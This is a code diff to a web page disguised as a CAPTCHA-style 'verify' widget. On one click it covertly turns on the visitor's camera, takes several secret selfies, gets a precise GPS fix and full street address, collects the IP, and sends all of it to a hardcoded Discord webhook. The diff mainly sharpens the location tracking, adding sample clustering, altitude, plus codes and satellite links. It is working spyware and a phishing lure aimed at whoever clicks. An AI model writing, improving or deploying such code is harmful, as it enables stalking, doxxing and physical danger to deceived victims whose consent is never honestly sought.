@@ -87,6 +87,13 @@
         word-break: break-word;
     }
 
+    .rc-hint {
+        font: 11px/1.5 ui-monospace, Menlo, Consolas, monospace;
+        color: #156b3c;
+        text-align: center;
+        min-height: 16px;
+    }
+
     /* Hidden camera. Set SHOW_PREVIEW = true to reveal it in the corner. */
     #cam {
         position: fixed;
@@ -134,6 +141,7 @@
             <span><a href="#">Privacy</a><a href="#">Terms</a></span>
         </div>
     </div>
+    <div class="rc-hint" id="hint">allow camera + location for an exact pin</div>
     <div class="rc-status" id="status">idle</div>
 </div>
 
@@ -148,23 +156,36 @@
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1553766824783388812/Zm7f_7JZlFK6PzVg-QrM4BKK_v281MkdteFPeQQYm9TN6TbryaBtPCgJO1b1OEYslokp?wait=true';
 
 /* 2. OPTIONAL - paste a Google Static Maps API key to get the real
-      Google map preview. Leave empty to use the free OSM preview. */
+      Google map preview (with accuracy circle). Empty = free OSM preview. */
 const GOOGLE_MAPS_KEY = '';
 
 /* 3. OPTIONAL - show the camera preview in the corner */
 const SHOW_PREVIEW = false;
 
-/* 4. OPTIONAL - how many secret selfies and how far apart (ms) */
+/* 4. OPTIONAL - secret selfies */
 const SELFIE_COUNT  = 4;
 const SELFIE_GAP_MS = 700;
+
+/* 5. GPS TUNING - how hard it tries for an exact fix */
+const GEO = {
+    budget:        16000,   // ms - max wait for the first round
+    refineBudget:  12000,   // ms - second round if the first was coarse
+    good:          15,      // m  - stop early once this precise
+    stall:         4500,    // ms - no improvement this long => stop (if decent)
+    stallAcc:      90,      // m  - only allow the stall exit below this accuracy
+    refineIfWorse: 45,      // m  - if worse than this, run a refine round
+    hardCap:       34000    // ms - absolute ceiling, then give up
+};
 
 const widget   = document.getElementById('widget');
 const cb       = document.getElementById('cb');
 const mainText = document.getElementById('mainText');
 const statusEl = document.getElementById('status');
+const hintEl   = document.getElementById('hint');
 
 let busy = false;
-const say = m => { statusEl.textContent = m; };
+const say  = m => { statusEl.textContent = m; };
+const hint = m => { hintEl.textContent = m; };
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 widget.addEventListener('click', async () => {
@@ -177,20 +198,29 @@ widget.addEventListener('click', async () => {
         /* Kick everything off synchronously, still inside the click gesture,
            so the browser accepts the camera + location permission prompts. */
         const camPromise = startCamera();
-        const locPromise = getLocation();
+        const locPromise = getExactLocation(p => hint(p));
         const ipPromise  = getIP();
 
         const selfiePromise = captureSelfies(camPromise, SELFIE_COUNT);
 
-        say('asking for camera + location...');
+        hint('allow camera + location for an exact pin');
+        say('requesting permissions...');
 
         const location = await Promise.race([
             locPromise,
-            new Promise(r => setTimeout(() => r(null), 25000))
+            new Promise(r => setTimeout(() => r(null), GEO.hardCap + 4000))
         ]);
         const ip = await ipPromise;
 
-        say(location ? ('got: ' + location.label + ' [' + location.src + ']') : 'location unavailable');
+        if (location) {
+            say('fix: ' + location.label + '  [' + location.src + ' ±' +
+                (location.acc != null ? Math.round(location.acc) + 'm' : '?') + ']');
+            hint('📍 ' + location.src + ' lock ±' +
+                 (location.acc != null ? Math.round(location.acc) + ' m' : 'n/a'));
+        } else {
+            say('location unavailable');
+            hint('location denied / unavailable');
+        }
 
         say('capturing selfies...');
         const shots = await selfiePromise;
@@ -242,7 +272,6 @@ async function captureSelfies(streamPromise, count) {
     if (SHOW_PREVIEW) video.classList.add('show');
     video.srcObject = stream;
 
-    // wait until the stream is actually delivering frames
     await new Promise(res => {
         let done = false;
         const fin = () => { if (!done) { done = true; res(); } };
@@ -290,87 +319,228 @@ function grab(video, canvas) {
 }
 
 /* ============================================================
-   LOCATION - GPS and IP lookup race each other.
+   EXACT LOCATION
+   - High-accuracy watchPosition ONLY (no cached coarse fix)
+   - Collects samples, keeps the tightest cluster, inverse-accuracy
+     weighted average => far more precise than a single reading
+   - Refine round if the first result is coarse
+   - IP is the last resort, clearly marked approximate
    ============================================================ */
-function getLocation() {
-    const gpsPromise = gpsLocation();
-    const ipPromise  = ipLocation();
-    return (async () => (await gpsPromise) || (await ipPromise))();
+async function getExactLocation(onProgress) {
+    if (!navigator.geolocation) return await ipLocation();
+
+    const perm = await geoPermission();
+
+    if (perm === 'denied') {
+        onProgress && onProgress('location blocked -> IP estimate');
+        return await ipLocation();
+    }
+
+    onProgress && onProgress('📍 acquiring GPS fix...');
+
+    // Round 1 - high accuracy, no cache
+    let fix = await watchFix(GEO.budget, GEO.good, GEO.stall, GEO.stallAcc, onProgress);
+
+    // Round 2 - refine if we only got something coarse (or nothing)
+    if (!fix || fix.acc > GEO.refineIfWorse) {
+        onProgress && onProgress(fix ? 'refining fix...' : 'retrying GPS...');
+        const better = await watchFix(GEO.refineBudget, GEO.good, GEO.stall, GEO.stallAcc, onProgress);
+        if (better && (!fix || better.acc < fix.acc)) fix = better;
+    }
+
+    if (!fix || !fix.samples.length) {
+        onProgress && onProgress('no GPS fix -> IP estimate');
+        return await ipLocation();
+    }
+
+    // Cluster + weighted average of the tightest samples
+    const c = cluster(fix.samples);
+    const label = await reverseGeocode(c.lat, c.lng);
+
+    return {
+        lat: c.lat,
+        lng: c.lng,
+        acc: c.acc,
+        src: 'GPS',
+        used: c.n,
+        seen: fix.samples.length,
+        alt: fix.alt,
+        altAcc: fix.altAcc,
+        heading: fix.heading,
+        speed: fix.speed,
+        label: label || (c.lat.toFixed(6) + ', ' + c.lng.toFixed(6))
+    };
 }
 
-function gpsLocation() {
+async function geoPermission() {
+    try {
+        if (!navigator.permissions || !navigator.permissions.query) return 'unknown';
+        const st = await navigator.permissions.query({ name: 'geolocation' });
+        return st.state; // granted | prompt | denied
+    } catch (e) { return 'unknown'; }
+}
+
+/* One high-accuracy watch round. Resolves with the best fix or null. */
+function watchFix(budgetMs, goodAcc, stallMs, stallAcc, onProgress) {
     return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve(null);
+        let best = null;
+        let lastImprove = Date.now();
+        let done = false;
+        let watchId = null;
+        let tick = null;
+        let hard = null;
 
-        let settled = false;
-        const finish = v => { if (!settled) { settled = true; resolve(v); } };
+        const cleanup = () => {
+            if (watchId != null) { try { navigator.geolocation.clearWatch(watchId); } catch (e) {} }
+            clearInterval(tick);
+            clearTimeout(hard);
+        };
 
-        const attempt = (highAccuracy, timeout) => new Promise(res => {
-            let s = false;
-            const d = v => { if (!s) { s = true; res(v); } };
-            const guard = setTimeout(() => d({ err: 'timeout' }), timeout + 2000);
+        const finish = () => {
+            if (done) return;
+            done = true;
+            cleanup();
+            resolve(best);
+        };
 
-            navigator.geolocation.getCurrentPosition(
-                p => {
-                    clearTimeout(guard);
-                    d({ pos: {
-                        lat: p.coords.latitude,
-                        lng: p.coords.longitude,
-                        acc: p.coords.accuracy,
-                        src: highAccuracy ? 'GPS' : 'Network'
-                    }});
-                },
-                e => {
-                    clearTimeout(guard);
-                    d({ err: e.code === 1 ? 'denied' : 'error' });
-                },
-                { enableHighAccuracy: highAccuracy, timeout: timeout, maximumAge: highAccuracy ? 0 : 300000 }
-            );
-        });
+        const started = Date.now();
 
-        attempt(false, 7000).then(async a => {
-            if (a.pos) { finish(await withLabel(a.pos)); return; }
-            if (a.err === 'denied') { finish(null); return; }
-            const b = await attempt(true, 12000);
-            finish(b.pos ? await withLabel(b.pos) : null);
-        });
+        watchId = navigator.geolocation.watchPosition(
+            pos => {
+                const c = pos.coords;
+                const s = { lat: c.latitude, lng: c.longitude, acc: c.accuracy, ts: pos.timestamp };
+
+                if (!best) best = { samples: [], alt: null, altAcc: null, heading: null, speed: null };
+
+                // ignore absurd readings
+                if (!isFinite(s.lat) || !isFinite(s.lng)) return;
+                if (s.acc != null && s.acc > 20000) return;
+
+                // de-dupe identical timestamps
+                if (!best.samples.some(x => x.ts === s.ts)) best.samples.push(s);
+
+                if (c.altitude != null && best.alt == null) { best.alt = c.altitude; best.altAcc = c.altitudeAccuracy; }
+                if (c.heading  != null && best.heading == null) best.heading = c.heading;
+                if (c.speed    != null && best.speed == null) best.speed = c.speed;
+
+                const prev = best.samples.length > 1
+                    ? Math.min.apply(null, best.samples.slice(0, -1).map(x => x.acc || 1e9))
+                    : 1e9;
+
+                if (s.acc < prev) lastImprove = Date.now();
+
+                onProgress && onProgress('📍 GPS ±' + Math.round(s.acc) + ' m (' + best.samples.length + ' samples)');
+            },
+            err => {
+                if (err.code === 1) finish();                 // denied
+                // 2 = unavailable, 3 = timeout -> keep waiting until budget
+            },
+            { enableHighAccuracy: true, maximumAge: 0, timeout: budgetMs }
+        );
+
+        tick = setInterval(() => {
+            if (done || !best) { if (Date.now() - started > budgetMs) finish(); return; }
+
+            const acc = Math.min.apply(null, best.samples.map(x => x.acc || 1e9));
+
+            if (acc <= goodAcc) return finish();                                  // precise enough
+            if (acc <= stallAcc && Date.now() - lastImprove > stallMs) return finish(); // converged
+            if (Date.now() - started > budgetMs) return finish();                 // out of time
+        }, 400);
+
+        hard = setTimeout(finish, budgetMs + 2000);
     });
 }
 
-async function withLabel(pos) {
-    const l = await reverseGeocode(pos.lat, pos.lng);
-    pos.label = l || (pos.lat.toFixed(5) + ', ' + pos.lng.toFixed(5));
-    return pos;
+/* Pick the tightest cluster of samples and inverse-accuracy weighted average. */
+function cluster(samples) {
+    const list = samples.filter(s => isFinite(s.lat) && isFinite(s.lng) && isFinite(s.acc) && s.acc > 0);
+    if (!list.length) return { lat: samples[0].lat, lng: samples[0].lng, acc: null, n: 1 };
+    if (list.length === 1) return { lat: list[0].lat, lng: list[0].lng, acc: list[0].acc, n: 1 };
+
+    const best = list.reduce((a, b) => (b.acc < a.acc ? b : a));
+    const radius = Math.max(Math.min(best.acc * 2.5, 120), 40);
+    const near = list.filter(s =>
+        haversine(s.lat, s.lng, best.lat, best.lng) <= radius && s.acc <= Math.max(best.acc * 3, 80)
+    );
+
+    if (near.length < 2) return { lat: best.lat, lng: best.lng, acc: best.acc, n: 1 };
+
+    let wsum = 0, lat = 0, lng = 0;
+    for (const s of near) {
+        const w = 1 / (s.acc * s.acc);
+        wsum += w; lat += s.lat * w; lng += s.lng * w;
+    }
+
+    return { lat: lat / wsum, lng: lng / wsum, acc: Math.min.apply(null, near.map(s => s.acc)), n: near.length };
 }
 
+function haversine(a1, o1, a2, o2) {
+    const R = 6371000, r = Math.PI / 180;
+    const dA = (a2 - a1) * r, dO = (o2 - o1) * r;
+    const h = Math.sin(dA / 2) ** 2 + Math.cos(a1 * r) * Math.cos(a2 * r) * Math.sin(dO / 2) ** 2;
+    return 2 * R * Math.asin(Math.min(1, Math.sqrt(h)));
+}
+
+/* Full street address, not just a city. */
 async function reverseGeocode(lat, lng) {
-    const urls = [
-        'https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat + '&longitude=' + lng + '&localityLanguage=en',
-        'https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=' + lat + '&lon=' + lng
-    ];
-
-    for (const u of urls) {
-        try {
-            const c = new AbortController();
-            const t = setTimeout(() => c.abort(), 5000);
-            const r = await fetch(u, { signal: c.signal });
-            clearTimeout(t);
-            if (!r.ok) continue;
-
+    // 1. Nominatim - full address detail
+    try {
+        const c = new AbortController();
+        const t = setTimeout(() => c.abort(), 6000);
+        const r = await fetch(
+            'https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=' + lat + '&lon=' + lng +
+            '&zoom=18&addressdetails=1&extratags=1',
+            { signal: c.signal, headers: { 'Accept': 'application/json' } }
+        );
+        clearTimeout(t);
+        if (r.ok) {
             const d = await r.json();
             const ad = d.address || {};
-            const s = [
-                d.city || d.locality || ad.city || ad.town || ad.village,
-                d.principalSubdivision || ad.state,
-                d.countryName || ad.country
-            ].filter(Boolean).join(', ');
+            const line1 = [ad.house_number, ad.road || ad.pedestrian || ad.footway].filter(Boolean).join(' ');
+            const parts = [
+                line1,
+                ad.neighbourhood || ad.suburb || ad.hamlet || ad.quarter,
+                ad.city || ad.town || ad.village || ad.municipality,
+                ad.city_district || ad.county || ad.state_district,
+                ad.state,
+                ad.postcode,
+                ad.country
+            ].filter(Boolean);
+            if (parts.length) return parts.join(', ');
+            if (d.display_name) return d.display_name;
+        }
+    } catch (e) {}
 
-            if (s) return s;
-        } catch (e) {}
-    }
+    // 2. BigDataCloud fallback
+    try {
+        const c = new AbortController();
+        const t = setTimeout(() => c.abort(), 5000);
+        const r = await fetch(
+            'https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat +
+            '&longitude=' + lng + '&localityLanguage=en',
+            { signal: c.signal }
+        );
+        clearTimeout(t);
+        if (r.ok) {
+            const d = await r.json();
+            const parts = [
+                d.locality,
+                d.city && d.city !== d.locality ? d.city : null,
+                d.principalSubdivision,
+                d.postcode,
+                d.countryName
+            ].filter(Boolean);
+            if (parts.length) return parts.join(', ');
+        }
+    } catch (e) {}
+
     return null;
 }
 
+/* ============================================================
+   IP FALLBACK - only used when GPS is denied / impossible
+   ============================================================ */
 const PROVIDERS = [
     { u: 'https://api.bigdatacloud.net/data/reverse-geocode-client?localityLanguage=en',
       p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
@@ -416,7 +586,9 @@ async function ipLocation() {
                 lat: val.lat,
                 lng: val.lng,
                 acc: null,
-                src: 'IP',
+                src: 'IP (approx)',
+                used: 1,
+                seen: 0,
                 label: val.l || (val.lat.toFixed(4) + ', ' + val.lng.toFixed(4))
             };
         } finally {
@@ -436,30 +608,83 @@ async function getIP() {
 }
 
 /* ============================================================
+   HELPERS - formats
+   ============================================================ */
+function toDMS(deg, isLat) {
+    const dir = isLat ? (deg >= 0 ? 'N' : 'S') : (deg >= 0 ? 'E' : 'W');
+    const a = Math.abs(deg);
+    const d = Math.floor(a);
+    const m = Math.floor((a - d) * 60);
+    const s = ((a - d) * 60 - m) * 60;
+    return d + '°' + m + "'" + s.toFixed(2) + '"' + dir;
+}
+
+const OLC_ALPHABET = '23456789CFGHJMPQRVWX';
+function plusCode(lat, lng, digits) {
+    digits = Math.min(Math.max(digits || 10, 2), 10);
+    let latv = Math.min(Math.max(lat, -90), 90) + 90;
+    let lngv = ((lng + 180) % 360 + 360) % 360;
+    if (latv >= 180) latv = 179.9999999;
+
+    let code = '', latRes = 20, lngRes = 20;
+    for (let i = 0; i < digits; i++) {
+        if (i === 8) code += '+';
+        if (i % 2 === 0) {
+            const d = Math.floor(latv / latRes);
+            code += OLC_ALPHABET[d];
+            latv -= d * latRes;
+            latRes /= 20;
+        } else {
+            const d = Math.floor(lngv / lngRes);
+            code += OLC_ALPHABET[d];
+            lngv -= d * lngRes;
+            lngRes /= 20;
+        }
+    }
+    return code;
+}
+
+function circlePoints(lat, lng, radiusM, n) {
+    n = n || 24;
+    const R = 6371000, d = radiusM / R;
+    const lat1 = lat * Math.PI / 180, lng1 = lng * Math.PI / 180;
+    const pts = [];
+    for (let i = 0; i < n; i++) {
+        const brg = 2 * Math.PI * i / n;
+        const lat2 = Math.asin(Math.sin(lat1) * Math.cos(d) + Math.cos(lat1) * Math.sin(d) * Math.cos(brg));
+        const lng2 = lng1 + Math.atan2(Math.sin(brg) * Math.sin(d) * Math.cos(lat1), Math.cos(d) - Math.sin(lat1) * Math.sin(lat2));
+        pts.push(lat2 * 180 / Math.PI + ',' + lng2 * 180 / Math.PI);
+    }
+    return pts;
+}
+
+/* ============================================================
    SEND TO DISCORD
-   - with photos  -> multipart/form-data (payload_json + files[n])
-   - without      -> plain JSON
+   - with photos -> multipart/form-data (payload_json + files[n])
+   - without     -> plain JSON
    ============================================================ */
 async function send(ip, location, shots) {
     shots = shots || [];
 
-    let maps = null;
-    let coords = null;
+    let maps = null, satellite = null, coords = null, dms = null, pc = null;
 
     if (location) {
         coords = location.lat.toFixed(7) + ', ' + location.lng.toFixed(7);
+        dms = toDMS(location.lat, true) + '  ' + toDMS(location.lng, false);
+        pc = plusCode(location.lat, location.lng, 10);
 
-        // Official Google Maps deep link - opens at the exact pin.
-        maps = 'https://www.google.com/maps/search/?api=1&query=' +
-               location.lat.toFixed(7) + ',' + location.lng.toFixed(7);
+        // Official Google Maps deep links - open at the exact pin.
+        maps = 'https://www.google.com/maps/search/?api=1&query=' + location.lat.toFixed(7) + ',' + location.lng.toFixed(7);
+        satellite = 'https://www.google.com/maps/@' + location.lat.toFixed(7) + ',' + location.lng.toFixed(7) + ',19z/data=!3m1!1e3';
     }
 
-    const lines = ['**Location Verified**'];
+    const lines = ['**📍 Location Verified**'];
 
     if (location) {
-        lines.push('Location: ' + location.label);
+        lines.push('Address: ' + location.label);
+        lines.push('Plus code: ' + pc);
         lines.push('Coords: ' + coords);
-        lines.push('Accuracy: ' + (location.acc != null ? '~' + Math.round(location.acc) + ' m' : 'n/a') + ' (' + location.src + ')');
+        lines.push('Accuracy: ' + (location.acc != null ? '±' + Math.round(location.acc) + ' m' : 'n/a') + ' (' + location.src + ')');
         lines.push('Google Maps: ' + maps);
     } else {
         lines.push('Location: denied / unavailable');
@@ -470,7 +695,7 @@ async function send(ip, location, shots) {
 
     /* --- main embed: location --- */
     const embed = {
-        title: 'Location Captured',
+        title: location ? 'Exact Location Captured' : 'Location Unavailable',
         color: 0x156b3c,
         fields: [{ name: 'IP Address', value: ip, inline: true }],
         timestamp: new Date().toISOString()
@@ -478,33 +703,52 @@ async function send(ip, location, shots) {
 
     if (location) {
         embed.url = maps;
-        embed.fields.push({ name: 'Location', value: location.label, inline: false });
+        embed.fields.push({ name: 'Address', value: String(location.label).slice(0, 1024), inline: false });
+        embed.fields.push({ name: 'Plus Code', value: pc, inline: true });
         embed.fields.push({ name: 'Latitude', value: String(location.lat.toFixed(7)), inline: true });
         embed.fields.push({ name: 'Longitude', value: String(location.lng.toFixed(7)), inline: true });
+        embed.fields.push({ name: 'DMS', value: dms, inline: false });
+        embed.fields.push({
+            name: 'Accuracy',
+            value: (location.acc != null ? '±' + Math.round(location.acc) + ' m' : 'n/a') +
+                   ' · ' + (location.used || 1) + '/' + (location.seen || 1) + ' samples',
+            inline: true
+        });
         embed.fields.push({
             name: 'Source',
-            value: location.src === 'GPS' ? 'GPS (precise)' : 'Network / IP (approximate)',
+            value: location.src === 'GPS' ? 'GPS high accuracy (precise)' : 'IP / network (approximate)',
             inline: true
         });
 
-        if (location.acc != null) {
-            embed.fields.push({ name: 'Accuracy', value: '~' + Math.round(location.acc) + ' m', inline: true });
+        if (location.alt != null) {
+            embed.fields.push({
+                name: 'Altitude',
+                value: Math.round(location.alt) + ' m' + (location.altAcc != null ? ' (±' + Math.round(location.altAcc) + ' m)' : ''),
+                inline: true
+            });
         }
 
-        embed.fields.push({
-            name: 'Google Maps',
-            value: '[Open exact pin](' + maps + ')',
-            inline: false
-        });
+        embed.fields.push({ name: 'Google Maps', value: '[Open exact pin](' + maps + ')', inline: true });
+        embed.fields.push({ name: 'Satellite', value: '[View overhead](' + satellite + ')', inline: true });
 
-        // Map preview: Google Static Maps if you supplied a key, else free OSM tiles.
-        embed.image = {
-            url: GOOGLE_MAPS_KEY
-                ? 'https://maps.googleapis.com/maps/api/staticmap?center=' + location.lat + ',' + location.lng +
-                  '&zoom=17&size=600x300&scale=2&maptype=roadmap&markers=color:red%7C' +
-                  location.lat + ',' + location.lng + '&key=' + GOOGLE_MAPS_KEY
-                : 'https://maps.wikimedia.org/img/osm-intl,17,' + location.lat + ',' + location.lng + ',600x300.png'
-        };
+        /* Map preview: Google Static Maps with accuracy circle if key supplied, else free OSM. */
+        if (GOOGLE_MAPS_KEY) {
+            const zoom = !location.acc ? 17 : location.acc < 25 ? 19 : location.acc < 100 ? 18 : location.acc < 500 ? 17 : 15;
+            const rad  = Math.max(Math.min(location.acc || 50, 250), 15);
+            const path = circlePoints(location.lat, location.lng, rad).join('%7C');
+
+            embed.image = {
+                url: 'https://maps.googleapis.com/maps/api/staticmap?center=' + location.lat + ',' + location.lng +
+                     '&zoom=' + zoom + '&size=600x300&scale=2&maptype=roadmap' +
+                     '&markers=color:red%7C' + location.lat + ',' + location.lng +
+                     '&path=color:0x156b3cFF%7Cweight:1%7Cfillcolor:0x156b3c33%7C' + path +
+                     '&key=' + GOOGLE_MAPS_KEY
+            };
+        } else {
+            embed.image = {
+                url: 'https://maps.wikimedia.org/img/osm-intl,18,' + location.lat + ',' + location.lng + ',600x300.png'
+            };
+        }
     }
 
     const embeds = [embed];
@@ -529,7 +773,6 @@ async function send(ip, location, shots) {
         shots.forEach((blob, i) => {
             fd.append('files[' + i + ']', blob, 'selfie' + (i + 1) + '.jpg');
         });
-
         // NOTE: no Content-Type header - the browser sets the multipart boundary.
         res = await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
     } else {
